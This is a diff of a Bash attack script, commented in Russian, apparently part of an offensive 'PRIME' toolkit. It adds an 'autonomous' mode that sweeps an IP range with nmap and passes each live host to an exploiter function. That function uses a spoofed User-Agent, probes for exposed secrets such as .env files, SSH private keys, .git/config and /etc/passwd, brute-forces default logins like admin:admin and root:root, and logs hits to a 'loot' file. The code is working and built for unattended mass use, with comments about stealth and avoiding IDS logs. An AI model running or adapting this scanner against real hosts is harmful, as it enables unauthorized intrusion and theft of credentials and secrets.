@@ -359,47 +359,96 @@ run_heuristic_scanner_v2() {
     pause
 }
 
+# 2. Автономный Сканер (Запустил и забыл)
 run_heuristic_scanner_v2() {
     clear
-    echo -e "${B}--------------------------------------------------${NC}"
-    echo -e "${B}---      HEURISTIC STEALTH SCANNER v2.0        ---${NC}"
-    echo -e "${B}--------------------------------------------------${NC}"
-    
-    read -p "Целевой IP/Range: " TARGET
-    [ -z "$TARGET" ] && return
+    echo -e "\e[1;35m--- PRIME MASTER: AUTONOMOUS SCANNER ---\e[0m"
+    read -p "ENTER SCOPE: " SCOPE
+    [[ -z "$SCOPE" ]] && return
 
-    echo -e "${Y}[*] Запуск бесшумного анализа (Native Bash Stack)...${NC}"
+    echo -e "\n\e[1;34m[*] Stealth Enumeration...\e[0m"
     
-    # Эвристика: проверяем только критические порты через системные дескрипторы
-    # Это не оставляет следов nmap в логах IDS
-    local ports=(21 22 23 80 443 445 3389 5555 8080)
-    for port in "${ports[@]}"; do
-        (
-            if timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null; then
-                echo -e "${G}[+] PORT $port OPEN${NC} -> $(timeout 1 openssl s_client -connect $TARGET:$port 2>/dev/null | grep "subject=" || echo "Service Detected")"
-            fi
-        ) &
-    done
-    wait
-    echo -e "${G}[+] Эвристический анализ завершен.${NC}"
-    pause
+    # Используем локальный файл, чтобы не конфликтовать с другими процессами
+    local TMP_NODES="/tmp/.nodes_$RANDOM"
+    
+    # Эвристика: только живые хосты. Минимальный таймаут.
+    nmap -n -sn --host-timeout 400ms "$SCOPE" 2>/dev/null | awk '/report for/{print $NF}' | tr -d '()' > "$TMP_NODES"
+
+    local COUNT=$(wc -l < "$TMP_NODES")
+    [[ "$COUNT" -eq 0 ]] && { echo "No targets."; return; }
+
+    echo -e "\e[1;32m[+]\e[0m Found $COUNT nodes. Starting Extraction...\n"
+
+    while read -r NODE; do
+        echo -e "\e[1;35m>>> TARGET:\e[0m \e[1;37m$NODE\e[0m"
+        run_prime_exploiter_v4 "$NODE"
+    done < "$TMP_NODES"
+
+    rm -f "$TMP_NODES"
+    echo -e "\n\e[1;32m[+++] COMPLETE. Loot: /root/prime_loot_live.txt\e[0m"
+    read -p "Press [ENTER]"
 }
 
 
+# 1. Единый Движок Эксплуатации (Умный + Автономный)
 run_prime_exploiter_v4() {
-    clear
-    echo -e "${R}--------------------------------------------------${NC}"
-    echo -e "${R}---      PRIME HEURISTIC FRAMEWORK (PHE)       ---${NC}"
-    echo -e "${R}--------------------------------------------------${NC}"
+    local TARGET="$1"
+    local AUTO_MODE=1
     
-    # Сохраняем логику выбора, но меняем наполнение на сверхбыстрое
-    local phe_names="ADB_Silent_Connect HID_Ducky_Attack Network_Pivot Back"
-    local phe_funcs="phe_core_adb phe_core_hid phe_core_pivot return"
-    
-    echo -e "${G}[SYSTEM] Mode: NetHunter Native / Zero-Day Heuristic${NC}"
-    echo -e "${W}--------------------------------------------------${NC}"
+    if [[ -z "$TARGET" ]]; then
+        AUTO_MODE=0
+        echo -e "\e[1;31m--- PRIME ULTIMATE EXPLOITER v4 ---\e[0m"
+        read -p "Target IP/Domain: " TARGET
+    fi
 
-    prime_dynamic_controller "PHE EXPLOIT CENTER" "$phe_names" "$phe_funcs"
+    [[ -z "$TARGET" ]] && return
+
+    # Параметры скрытности
+    local UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    local LOOT="/root/prime_loot_live.txt"
+
+    # Эвристические векторы (Путь:Маркер)
+    local V_LIST=(
+        "/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/.env:DB_PASSWORD"
+        "/.git/config:url =" "/.ssh/id_rsa:BEGIN RSA" "/wp-config.php.bak:DB_PASSWORD"
+        "/etc/passwd:root:x" "/config.xml:root" "/.history:password"
+    )
+    
+    # Критические учетные данные
+    local C_LIST=("admin:admin" "admin:password" "root:root" "admin:1234" "support:support")
+
+    for proto in "http" "https"; do
+        local BASE="${proto}://${TARGET}"
+        # Быстрая проверка доступности (только заголовки)
+        local CODE=$(curl -sL -k -I -A "$UA" --connect-timeout 2 --max-time 3 "$BASE/" -w "%{http_code}" -o /dev/null 2>/dev/null)
+
+        if [[ "$CODE" =~ ^(200|401|302)$ ]]; then
+            echo -e "    \e[1;32m[+]\e[0m $BASE [$CODE]"
+            
+            # --- Секция Векторов ---
+            for vec in "${V_LIST[@]}"; do
+                local V_PATH="${vec%%:*}"
+                local V_KEY="${vec#*:}"
+                if curl -sL -k -A "$UA" --max-time 2 "${BASE}${V_PATH}" 2>/dev/null | grep -q "$V_KEY"; then
+                    echo -e "    \e[1;31m[!!!] VULN:\e[0m $V_PATH"
+                    echo "[EXPL] ${TARGET}${V_PATH} | $V_KEY" >> "$LOOT"
+                fi
+            done
+
+            # --- Секция Брута (Smart Match) ---
+            for pair in "${C_LIST[@]}"; do
+                local U="${pair%%:*}"
+                local P="${pair#*:}"
+                if [[ $(curl -sL -k -u "$U:$P" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 2 "$BASE/") == "200" ]]; then
+                    echo -e "    \e[1;32m[!!!] AUTH:\e[0m $U:$P"
+                    echo "[AUTH] $U:$P @ $TARGET" >> "$LOOT"
+                    break
+                fi
+            done
+        fi
+    done
+
+    [[ "$AUTO_MODE" -eq 0 ]] && read -p "Done. Press [ENTER]"
 }
 
 # Внутренняя логика для ADB (без Python, только бинарник и bash)
